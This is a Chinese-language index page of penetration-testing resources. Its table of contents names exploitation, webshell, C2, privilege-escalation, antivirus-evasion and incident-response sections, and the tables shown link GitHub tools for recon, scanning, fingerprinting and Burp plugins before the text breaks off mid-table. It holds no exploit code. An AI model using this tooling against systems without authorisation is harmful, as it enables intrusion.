<li><a href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7">中间件&#x2F;应用漏洞利用工具</a></li>
<li><a href="#%E9%87%8D%E7%82%B9cms%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7">重点cms利用工具</a></li>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7">信息泄露利用工具</a></li>
<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7">数据库利用工具</a></li>
<li><a href="#%E7%88%86%E7%A0%B4%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7">爆破利用工具</a></li>
<li><a href="#%E5%85%A8%E7%BD%91%E5%AD%97%E5%85%B8%E6%94%B6%E9%9B%86">全网字典收集</a></li>
<li><a href="#%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7">常规漏洞利用工具</a></li>
<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7">反序列化利用工具</a></li>
<li><a href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7">内存马注入工具</a></li>
<li><a href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7-%E9%80%9A%E7%94%A8">代码审计辅助工具-通用</a></li>
<li><a href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7-java">代码审计辅助工具-java</a></li>
<li><a href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7-php">代码审计辅助工具-php</a></li>
<li><a href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7-dotnet">代码审计辅助工具-dotNET</a></li>
<li><a href="#%E9%80%9A%E7%94%A8%E5%9E%8Bwaf%E7%BB%95%E8%BF%87">通用型WAF绕过</a></li>
</ul>
</li>
<li><a href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7">内网渗透工具</a><ul>
<li><a href="#%E5%90%8E%E6%B8%97%E9%80%8F%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7">后渗透辅助工具</a></li>
<li><a href="#webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7">webshell管理工具</a></li>
<li><a href="#c2%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7">c2管理工具</a></li>
<li><a href="#%E6%8F%90%E6%9D%83%E9%A1%B9%E7%9B%AE">提权项目</a></li>
<li><a href="#%E5%86%85%E7%BD%91%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7">内网收集工具</a></li>
<li><a href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%B7%A5%E5%85%B7">横向移动工具</a></li>
<li><a href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7">域渗透工具</a></li>
<li><a href="#%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7">密码提取工具</a></li>
<li><a href="#%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7">隧道代理工具</a></li>
<li><a href="#%E4%BC%98%E7%A7%80%E5%85%8D%E6%9D%80%E9%A1%B9%E7%9B%AE">优秀免杀项目</a></li>
<li><a href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B7%A5%E5%85%B7">权限维持工具</a></li>
</ul>
</li>
<li><a href="#%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%90%AD%E5%BB%BA">基础设施搭建</a><ul>
<li><a href="#%E6%94%BB%E9%98%B2%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2">攻防环境部署</a></li>
<li><a href="#%E4%BB%A3%E7%90%86%E6%B1%A0">代理池</a></li>
<li><a href="#%E9%9D%B6%E5%9C%BA%E6%B8%85%E5%8D%95">靶场清单</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E8%AE%A2%E9%98%85%E5%AE%89%E5%85%A8%E6%8E%A8%E9%80%81">漏洞订阅&amp;安全推送</a></li>
</ul>
</li>
<li><a href="#%E8%BF%90%E7%BB%B4%E7%94%B2%E6%96%B9%E9%98%B2%E5%AE%88%E6%96%B9%E5%B7%A5%E5%85%B7">运维&amp;甲方&amp;防守方工具</a><ul>
<li><a href="#%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE">安全建设</a></li>
<li><a href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0">应急响应笔记</a></li>
<li><a href="#linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7">Linux应急响应工具</a></li>
<li><a href="#windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7">Windows应急响应工具</a></li>
<li><a href="#webshell%E6%9F%A5%E6%9D%80%E5%B7%A5%E5%85%B7">webshell查杀工具</a></li>
<li><a href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E5%B7%A5%E5%85%B7">内存马查杀工具</a></li>
<li><a href="#%E9%98%B2%E5%AE%88%E8%BE%85%E5%8A%A9%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7">防守辅助分析工具</a></li>
<li><a href="#%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6%E5%B7%A5%E5%85%B7">溯源反制工具</a></li>
</ul>
</li>
<li><a href="#%E5%85%B6%E4%BB%96%E5%AE%89%E5%85%A8%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86">其他安全资料整理</a><ul>
<li><a href="#java%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6">JAVA安全研究</a></li>
<li><a href="#ai%E5%AE%89%E5%85%A8">AI安全</a></li>
<li><a href="#%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95">安全面试</a></li>
<li><a href="#%E5%AE%9E%E6%88%98%E7%BA%A2%E8%93%9D%E8%B5%84%E6%96%99%E9%9B%86%E9%94%A6">实战红蓝资料集锦</a></li>
<li><a href="#%E4%BA%91%E5%AE%89%E5%85%A8%E8%B5%84%E6%96%99">云安全资料</a></li>
</ul>
</li>
</ul>
<h1 id="半-全自动化利用工具"><a href="#半-全自动化利用工具" class="headerlink" title="半&#x2F;全自动化利用工具"></a>半&#x2F;全自动化利用工具</h1><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>单兵作战武器库，你值得拥有</td>
<td><a href="https://github.com/yaklang/yakit">https://github.com/yaklang/yakit</a></td>
<td>yakit</td>
</tr>
<tr>
<td>ScopeSentry-网络空间测绘、子域名枚举、端口扫描、敏感信息发现、漏洞扫描、分布式节点</td>
<td><a href="https://github.com/Autumn-27/ScopeSentry-Scan">https://github.com/Autumn-27/ScopeSentry-Scan</a></td>
<td>ScopeSentry</td>
</tr>
<tr>
<td>CyberEdge 是一款精心设计的互联网资产测绘工具，为网络安全专业人士提供精准、高效的扫描体验。</td>
<td><a href="https://github.com/Symph0nia/CyberEdge">https://github.com/Symph0nia/CyberEdge</a></td>
<td>CyberEdge</td>
</tr>
<tr>
<td>dddd是一款使用简单的批量信息收集,供应链漏洞探测工具，旨在优化红队工作流，减少伤肝的机械性操作。支持从Hunter、Fofa批量拉取目标</td>
<td><a href="https://github.com/SleepingBag945/dddd">https://github.com/SleepingBag945/dddd</a></td>
<td>dddd</td>
</tr>
<tr>
<td>一款GUI界面的渗透工具，将部分人工经验转换为自动化，集成了渗透过程中常用到的一些功能，目前集成了端口扫描、端口爆破、web指纹扫描、漏洞扫描、漏洞利用以及编码转换功能，后续会持续更新。</td>
<td><a href="https://github.com/lz520520/railgun">https://github.com/lz520520/railgun</a></td>
<td>Railgun</td>
</tr>
<tr>
<td>安全服务集成化工具平台</td>
<td><a href="https://github.com/qiwentaidi/Slack">https://github.com/qiwentaidi/Slack</a></td>
<td>Slack</td>
</tr>
<tr>
<td>密探渗透测试工具包含资产信息收集，子域名爆破，搜索语法，资产测绘（FOFA，Hunter，quake, ZoomEye），指纹识别，敏感信息采集，文件扫描、端口扫描、批量信息权重查询、密码字典等功能</td>
<td><a href="https://github.com/kkbo8005/mitan">https://github.com/kkbo8005/mitan</a></td>
<td>mitan</td>
</tr>
<tr>
<td><strong>Nemo</strong>是用来进行自动化信息收集的一个简单平台，通过集成常用的信息收集工具和技术，实现对内网及互联网资产信息的自动收集，提高隐患排查和渗透测试的工作效率。</td>
<td><a href="https://github.com/hanc00l/nemo_go">https://github.com/hanc00l/nemo_go</a></td>
<td>nemo_go</td>
</tr>
<tr>
<td>DarkAngel 是一款全自动白帽漏洞扫描器，从hackerone、bugcrowd资产监听到漏洞报告生成、企业微信通知。</td>
<td><a href="https://github.com/Bywalks/DarkAngel">https://github.com/Bywalks/DarkAngel</a></td>
<td>DarkAngel</td>
</tr>
<tr>
<td>分布式资产信息收集和漏洞扫描平台</td>
<td><a href="https://github.com/1in9e/gosint">https://github.com/1in9e/gosint</a></td>
<td>gosint</td>
</tr>
<tr>
<td>一条龙服务，只需要输入根域名即可全方位收集相关资产，并检测漏洞。也可以输入多个域名、C段IP等，具体案例见下文。</td>
<td><a href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a></td>
<td>ShuiZe_0x727</td>
</tr>
<tr>
<td>自动化巡航扫描框架（可用于红队打点评估）</td>
<td><a href="https://github.com/b0bac/ApolloScanner">https://github.com/b0bac/ApolloScanner</a></td>
<td>ApolloScanner</td>
</tr>
<tr>
<td>可针对指定IP段、资产清单、存活网段自动化进行端口扫描以及TCP指纹识别和Banner抓取</td>
<td><a href="https://github.com/lcvvvv/kscan">https://github.com/lcvvvv/kscan</a></td>
<td>kscan</td>
</tr>
<tr>
<td>集成 vscan、nuclei、ksubdomain、subfinder等，充分自动化、智能化 并对这些集成的项目进行代码级别优化、参数优化，个别模块,如 vscan filefuzz部分进行了重写</td>
<td><a href="https://github.com/GhostTroops/scan4all">https://github.com/GhostTroops/scan4all</a></td>
<td>scan4all</td>
</tr>
<tr>
<td>一个辅助平常渗透测试项目或者攻防项目快速打点的综合工具</td>
<td><a href="https://github.com/P1-Team/AlliN">https://github.com/P1-Team/AlliN</a></td>
<td>AlliN</td>
</tr>
<tr>
<td>一个漏洞扫描器粘合剂,添加目标后30款工具自动调用</td>
<td><a href="https://github.com/78778443/QingScan">https://github.com/78778443/QingScan</a></td>
<td>QingScan</td>
</tr>
<tr>
<td>从子域名、端口服务、漏洞、爬虫等一体化的资产管理系统</td>
<td><a href="https://github.com/CTF-MissFeng/bayonet">https://github.com/CTF-MissFeng/bayonet</a></td>
<td>bayonet</td>
</tr>
<tr>
<td>一个高度可定制Web自动化扫描框架</td>
<td><a href="https://github.com/r3curs1v3-pr0xy/vajra">https://github.com/r3curs1v3-pr0xy/vajra</a></td>
<td>vajra</td>
</tr>
<tr>
<td>reconFTW 集成了30个工具的信息收集利器</td>
<td><a href="https://github.com/six2dez/reconftw">https://github.com/six2dez/reconftw</a></td>
<td>reconftw</td>
</tr>
<tr>
<td>自动化侦查框架</td>
<td><a href="https://github.com/yogeshojha/rengine">https://github.com/yogeshojha/rengine</a></td>
<td>rengine</td>
</tr>
</tbody></table>
<h1 id="信息收集工具"><a href="#信息收集工具" class="headerlink" title="信息收集工具"></a>信息收集工具</h1><h2 id="资产发现工具"><a href="#资产发现工具" class="headerlink" title="资产发现工具"></a>资产发现工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>reconFTW 集成了30个工具的信息收集利器</td>
<td><a href="https://github.com/six2dez/reconftw">https://github.com/six2dez/reconftw</a></td>
<td>reconftw</td>
</tr>
<tr>
<td>资产无限巡航扫描系统</td>
<td><a href="https://github.com/awake1t/linglong">https://github.com/awake1t/linglong</a></td>
<td>linglong</td>
</tr>
<tr>
<td>SRC子域名资产监控</td>
<td><a href="https://github.com/LangziFun/LangSrcCurise">https://github.com/LangziFun/LangSrcCurise</a></td>
<td>LangSrcCurise</td>
</tr>
<tr>
<td>快速侦察与目标关联的互联网资产，构建基础资产信息库。</td>
<td><a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></td>
<td>ARL(灯塔)</td>
</tr>
<tr>
<td>集成GoogleHacking语法来进行信息收集</td>
<td><a href="https://github.com/TebbaaX/GRecon">https://github.com/TebbaaX/GRecon</a></td>
<td>Grecon</td>
</tr>
<tr>
<td>从第三方平台获取目标网页内容</td>
<td><a href="https://github.com/tomnomnom/waybackurls">https://github.com/tomnomnom/waybackurls</a></td>
<td>waybackurls</td>
</tr>
<tr>
<td>从多个网站提取目标相关信息</td>
<td><a href="https://github.com/lc/gau">https://github.com/lc/gau</a></td>
<td>gau</td>
</tr>
<tr>
<td>集合了多个网络测绘平台，可以快速在多个网络测绘平台搜索信息并且合并展示及导出。</td>
<td><a href="https://github.com/ExpLangcn/InfoSearchAll">https://github.com/ExpLangcn/InfoSearchAll</a></td>
<td>InfoSearchAll</td>
</tr>
<tr>
<td>调用fofa\ZoomEye\360quake的官方api—GUI界面</td>
<td><a href="https://github.com/xzajyjs/ThunderSearch">https://github.com/xzajyjs/ThunderSearch</a></td>
<td>ThunderSearch</td>
</tr>
<tr>
<td>集成多个网络资产测绘平台的搜索工具</td>
<td><a href="https://github.com/Kento-Sec/AsamF">https://github.com/Kento-Sec/AsamF</a></td>
<td>AsamF</td>
</tr>
<tr>
<td>一个简单实用的FOFA客户端 By flashine</td>
<td><a href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a></td>
<td>fofa_viewer</td>
</tr>
<tr>
<td>0_zone_zpi脚本</td>
<td><a href="https://github.com/lemonlove7/0_zone">https://github.com/lemonlove7/0_zone</a></td>
<td>0_zone</td>
</tr>
<tr>
<td>icp备案查询、企业资产快速收集工具</td>
<td><a href="https://github.com/SiJiDo/IEyes">https://github.com/SiJiDo/IEyes</a></td>
<td>IEyes</td>
</tr>
<tr>
<td>一款基于各大企业信息API的工具</td>
<td><a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></td>
<td>ENScan_GO</td>
</tr>
<tr>
<td>基于斗象灯塔ARL修改后的版本。相比原版，增加了OneForAll、中央数据库，修改了altDns</td>
<td><a href="https://github.com/ki9mu/ARL-plus-docker">https://github.com/ki9mu/ARL-plus-docker</a></td>
<td>ARL-plus-docker</td>
</tr>
<tr>
<td>灯塔（最新版）指纹添加脚本！</td>
<td><a href="https://github.com/loecho-sec/ARL-Finger-ADD">https://github.com/loecho-sec/ARL-Finger-ADD</a></td>
<td>ARL-Finger-ADD</td>
</tr>
</tbody></table>
<h2 id="子域名收集工具"><a href="#子域名收集工具" class="headerlink" title="子域名收集工具"></a>子域名收集工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>在线子域名收集</td>
<td><a href="https://rapiddns.io/subdomain">https://rapiddns.io/subdomain</a></td>
<td>在线收集</td>
</tr>
<tr>
<td>ksubdomain 无状态子域名爆破工具</td>
<td><a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></td>
<td>ksubdomain</td>
</tr>
<tr>
<td>一款功能强大的子域收集工具</td>
<td><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></td>
<td>oneforall</td>
</tr>
<tr>
<td>通过使用被动在线资源来发现网站的有效子域</td>
<td><a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></td>
<td>subfinder</td>
</tr>
<tr>
<td>src子域名监控</td>
<td><a href="https://github.com/LangziFun/LangSrcCurise">https://github.com/LangziFun/LangSrcCurise</a></td>
<td>LangSrcCurise</td>
</tr>
<tr>
<td>从 github 上发现子域名</td>
<td><a href="https://github.com/gwen001/github-subdomains">https://github.com/gwen001/github-subdomains</a></td>
<td>github-subdomains</td>
</tr>
<tr>
<td>Layer子域名挖掘机</td>
<td><a href="https://github.com/euphrat1ca/LayerDomainFinder">https://github.com/euphrat1ca/LayerDomainFinder</a></td>
<td>Layer</td>
</tr>
<tr>
<td>好用且强大的子域名扫描工具</td>
<td><a href="https://github.com/yunxu1/dnsub">https://github.com/yunxu1/dnsub</a></td>
<td>dnsub</td>
</tr>
</tbody></table>
<h2 id="目录扫描工具"><a href="#目录扫描工具" class="headerlink" title="目录扫描工具"></a>目录扫描工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>Web path scanner  目录扫描工具</td>
<td><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></td>
<td>dirsearch</td>
</tr>
<tr>
<td>用Rust编写的快速，简单，递归的内容发现工具</td>
<td><a href="https://github.com/epi052/feroxbuster">https://github.com/epi052/feroxbuster</a></td>
<td>feroxbuster</td>
</tr>
<tr>
<td>Directory&#x2F;File, DNS and VHost busting tool written in Go</td>
<td><a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></td>
<td>gobuster</td>
</tr>
<tr>
<td>用Go编写的模糊测试工具</td>
<td><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></td>
<td>ffuf</td>
</tr>
<tr>
<td>Next Generation HTTP Dir&#x2F;File Fuzz Tool</td>
<td><a href="https://github.com/chainreactors/spray">https://github.com/chainreactors/spray</a></td>
<td>spray</td>
</tr>
<tr>
<td>通过提取自动加载和静态地址中的JS和页面内容，解析Webpack打包和使用正则匹配技术，发现API接口及Base URL。</td>
<td><a href="https://github.com/0x727/ChkApi_0x727">https://github.com/0x727/ChkApi_0x727</a></td>
<td>ChkApi_0x727</td>
</tr>
<tr>
<td>Fast passive URL enumeration tool.</td>
<td><a href="https://github.com/chainreactors/urlfounder">https://github.com/chainreactors/urlfounder</a></td>
<td>urlfounder</td>
</tr>
<tr>
<td>一个高级web目录、文件扫描工具</td>
<td><a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></td>
<td>dirmap</td>
</tr>
<tr>
<td>网站的敏感目录发掘工具</td>
<td><a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a></td>
<td>cansina</td>
</tr>
<tr>
<td>御剑后台扫描工具珍藏版</td>
<td><a href="https://www.fujieace.com/hacker/tools/yujian.html">https://www.fujieace.com/hacker/tools/yujian.html</a></td>
<td>御剑</td>
</tr>
<tr>
<td>使用GoLang开发的目录&#x2F;子域扫描器</td>
<td><a href="https://github.com/ReddyyZ/urlbrute">https://github.com/ReddyyZ/urlbrute</a></td>
<td>urlbrute</td>
</tr>
<tr>
<td>御剑目录扫描专业版</td>
<td><a href="https://github.com/foryujian/yjdirscan">https://github.com/foryujian/yjdirscan</a></td>
<td>yjdirscan</td>
</tr>
<tr>
<td>类似JSFinder的golang实现，更快更全更舒服</td>
<td><a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a></td>
<td>URLFinder</td>
</tr>
<tr>
<td>爬虫 可以发现搜索引擎发现不了的目录</td>
<td><a href="https://github.com/jaeles-project/gospider">https://github.com/jaeles-project/gospider</a></td>
<td>gospider</td>
</tr>
<tr>
<td>katana 是 projectdiscovery 项目中的一个网页链接抓取工具，可以自动解析js文件。新一代爬行框架。</td>
<td><a href="https://github.com/projectdiscovery/katana">https://github.com/projectdiscovery/katana</a></td>
<td>katana</td>
</tr>
<tr>
<td>dontgo403 是一个绕过 40X 错误的工具。</td>
<td><a href="https://github.com/devploit/dontgo403">https://github.com/devploit/dontgo403</a></td>
<td>dontgo403</td>
</tr>
<tr>
<td>从JavaScript中提取URL、路径、机密和其他有趣的部分</td>
<td><a href="https://github.com/BishopFox/jsluice">https://github.com/BishopFox/jsluice</a></td>
<td>jsluice</td>
</tr>
<tr>
<td>爬网站JS文件，自动fuzz api接口，指定api接口（针对前后端分离项目，可指定后端接口地址），回显api响应</td>
<td><a href="https://github.com/ttstormxx/jjjjjjjjjjjjjs">https://github.com/ttstormxx/jjjjjjjjjjjjjs</a></td>
<td>jjjjjjjjjjjjjs</td>
</tr>
</tbody></table>
<h2 id="指纹识别工具"><a href="#指纹识别工具" class="headerlink" title="指纹识别工具"></a>指纹识别工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>红队重点攻击系统指纹探测工具</td>
<td><a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></td>
<td>EHole(棱洞)3.0 重构版</td>
</tr>
<tr>
<td>EHole(棱洞)魔改。可对路径进行指纹识别；支持识别出来的重点资产进行漏洞检测(支持从hunter和fofa中提取资产)支持对ftp服务识别及爆破</td>
<td><a href="https://github.com/lemonlove7/EHole_magic">https://github.com/lemonlove7/EHole_magic</a></td>
<td>EHole_magic</td>
</tr>
<tr>
<td>跨平台指纹识别工具</td>
<td><a href="https://github.com/0x727/ObserverWard">https://github.com/0x727/ObserverWard</a></td>
<td>ObserverWard</td>
</tr>
<tr>
<td>Glass是一款针对资产列表的快速指纹识别工具</td>
<td><a href="https://github.com/s7ckTeam/Glass">https://github.com/s7ckTeam/Glass</a></td>
<td>Glass</td>
</tr>
<tr>
<td>红队行动下的重点资产指纹识别工具</td>
<td><a href="https://github.com/P001water/P1finger">https://github.com/P001water/P1finger</a></td>
<td>P1finger</td>
</tr>
<tr>
<td>Resources一款红队在大量的资产中存活探测与重点攻击系统指纹探测工具</td>
<td><a href="https://github.com/EASY233/Finger">https://github.com/EASY233/Finger</a></td>
<td>Finger</td>
</tr>
<tr>
<td>TideFinger——指纹识别小工具，汲取整合了多个web指纹库</td>
<td><a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></td>
<td>TideFinger</td>
</tr>
<tr>
<td>【暂未开源】一个Go版(更强大)的TideFinger指纹识别工具，可对web和主机指纹进行识别探测，整合梳理互联网指纹2.3W余条，在效率和指纹覆盖面方面进行了平衡和优化。</td>
<td><a href="https://github.com/TideSec/TideFinger_Go">https://github.com/TideSec/TideFinger_Go</a></td>
<td>TideFinger_Go</td>
</tr>
<tr>
<td>Golang实现Wappalyzer 指纹识别</td>
<td><a href="https://github.com/projectdiscovery/wappalyzergo">https://github.com/projectdiscovery/wappalyzergo</a></td>
<td>wappalyzergo</td>
</tr>
<tr>
<td>功能齐全的Web指纹识别和分享平台，内置了一万多条互联网开源的指纹信息。</td>
<td><a href="https://github.com/b1ackc4t/14Finger">https://github.com/b1ackc4t/14Finger</a></td>
<td>14Finger</td>
</tr>
<tr>
<td>一个web应用程序指纹识别工具</td>
<td><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td>
<td>Whatweb</td>
</tr>
</tbody></table>
<h2 id="端口扫描工具"><a href="#端口扫描工具" class="headerlink" title="端口扫描工具"></a>端口扫描工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td><strong>MX1014</strong> 是一个遵循 <strong>“短平快”</strong> 原则的灵活、轻便和快速端口扫描器 (满足红队需求的出网测试、网段探测和快速高危端口扫描等需求)</td>
<td><a href="https://github.com/L-codes/MX1014">https://github.com/L-codes/MX1014</a></td>
<td>MX1014</td>
</tr>
<tr>
<td>naabu 用 go 编写的快速端口扫描器</td>
<td><a href="https://github.com/projectdiscovery/naabu">https://github.com/projectdiscovery/naabu</a></td>
<td>naabu</td>
</tr>
<tr>
<td>TXPortMap 实用型的端口扫描、服务识别工具</td>
<td><a href="https://github.com/4dogs-cn/TXPortMap">https://github.com/4dogs-cn/TXPortMap</a></td>
<td>TXPortMap</td>
</tr>
<tr>
<td>使用Golang开发的高并发网络扫描、服务探测工具</td>
<td><a href="https://github.com/Adminisme/ServerScan">https://github.com/Adminisme/ServerScan</a></td>
<td>serverScan</td>
</tr>
<tr>
<td>masnmapscan 一款端口扫描器。整合了masscan和nmap两款扫描器</td>
<td><a href="https://github.com/hellogoldsnakeman/masnmapscan-V1.0">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</a></td>
<td>整合扫描器</td>
</tr>
<tr>
<td>gonmap是一个go语言的nmap端口扫描库</td>
<td><a href="https://github.com/lcvvvv/gonmap">https://github.com/lcvvvv/gonmap</a></td>
<td>gonmap</td>
</tr>
<tr>
<td>光速扫描</td>
<td><a href="http://pan.baidu.com/s/1pLjaQKF">http://pan.baidu.com/s/1pLjaQKF</a></td>
<td>小米范</td>
</tr>
<tr>
<td>在线端口扫描1</td>
<td><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></td>
<td>在线工具</td>
</tr>
<tr>
<td>在线端口扫描2</td>
<td><a href="http://tool.cc/port/">http://tool.cc/port/</a></td>
<td>在线工具2</td>
</tr>
</tbody></table>
<h2 id="前端加解密工具"><a href="#前端加解密工具" class="headerlink" title="前端加解密工具"></a>前端加解密工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>浏览器内存漫游解决方案</td>
<td><a href="https://github.com/JSREI/ast-hook-for-js-RE">https://github.com/JSREI/ast-hook-for-js-RE</a></td>
<td>ast-hook-for-js-RE</td>
</tr>
<tr>
<td>一款支持多种加密算法、或直接执行浏览器JS代码的BurpSuite插件。</td>
<td><a href="https://github.com/whwlsfb/BurpCrypto">https://github.com/whwlsfb/BurpCrypto</a></td>
<td>BurpCrypto</td>
</tr>
<tr>
<td>一个想让你测试加密流量像测试明文一样简单高效的 Burp 插件。</td>
<td><a href="https://github.com/outlaws-bai/Galaxy">https://github.com/outlaws-bai/Galaxy</a></td>
<td>Galaxy</td>
</tr>
<tr>
<td>根据自定义来达到对数据包的处理（适用于加解密、爆破等），类似mitmproxy，不同点在于经过了burp中转</td>
<td><a href="https://github.com/f0ng/autoDecoder">https://github.com/f0ng/autoDecoder</a></td>
<td>autoDecoder</td>
</tr>
<tr>
<td>远程调用(rpc)浏览器方法，免去抠代码补环境</td>
<td><a href="https://github.com/jxhczhl/JsRpc">https://github.com/jxhczhl/JsRpc</a></td>
<td>JsRpc</td>
</tr>
<tr>
<td>基于CDP实现的远程JS debug工具</td>
<td><a href="https://github.com/1oid/remotejs">https://github.com/1oid/remotejs</a></td>
<td>remotejs</td>
</tr>
<tr>
<td>一款利用爬虫技术实现前端JS加密自动化绕过的渗透测试工具</td>
<td><a href="https://github.com/LiChaser/SpiderX">https://github.com/LiChaser/SpiderX</a></td>
<td>SpiderX</td>
</tr>
</tbody></table>
<h2 id="Burp插件"><a href="#Burp插件" class="headerlink" title="Burp插件"></a>Burp插件</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>有关burpsuite的插件(非商店),文章以及使用技巧的收集</td>
<td><a href="https://github.com/Mr-xn/BurpSuite-collections">https://github.com/Mr-xn/BurpSuite-collections</a></td>
<td>BurpSuite-collections</td>
</tr>
<tr>
<td>一个集成的BurpSuite漏洞探测插件</td>
<td><a href="https://github.com/Tsojan/TsojanScan">https://github.com/Tsojan/TsojanScan</a></td>
<td>TsojanScan</td>
</tr>
<tr>
<td>HaE 请求高亮标记与信息提取的辅助型 BurpSuite 插件</td>
<td><a href="https://github.com/gh0stkey/HaE">https://github.com/gh0stkey/HaE</a></td>
<td>HaE</td>
</tr>
<tr>
<td>分析、拆解HTTP协议报文，提取HTTP协议报文中的参数、路径、文件、参数值等信息，并统计出现的频次，帮助用户构建出具有实战应用价值的Fuzzing字典。</td>
<td><a href="https://github.com/gh0stkey/CaA">https://github.com/gh0stkey/CaA</a></td>
<td>CaA</td>
</tr>
<tr>
<td>一个集成的BurpSuite漏洞探测插件2</td>
<td><a href="https://github.com/kN6jq/gatherBurp">https://github.com/kN6jq/gatherBurp</a></td>
<td>gatherBurp</td>
</tr>
<tr>
<td>OneScan是递归目录扫描的BurpSuite插件。</td>
<td><a href="https://github.com/vaycore/OneScan">https://github.com/vaycore/OneScan</a></td>
<td>OneScan</td>
</tr>
<tr>
<td>解析提取接口路径+参数</td>
<td><a href="https://github.com/xnl-h4ck3r/GAP-Burp-Extension">https://github.com/xnl-h4ck3r/GAP-Burp-Extension</a></td>
<td>GAP-Burp-Extension</td>
</tr>
<tr>
<td>一款基于BurpSuite的被动式shiro检测插件</td>
<td><a href="https://github.com/pmiaowu/BurpShiroPassiveScan">https://github.com/pmiaowu/BurpShiroPassiveScan</a></td>
<td>BurpShiroPassiveScan</td>
</tr>
<tr>
<td>一款基于BurpSuite的被动式FastJson检测插件</td>
<td><a href="https://github.com/pmiaowu/BurpFastJsonScan">https://github.com/pmiaowu/BurpFastJsonScan</a></td>
<td>BurpFastJsonScan</td>
</tr>
<tr>
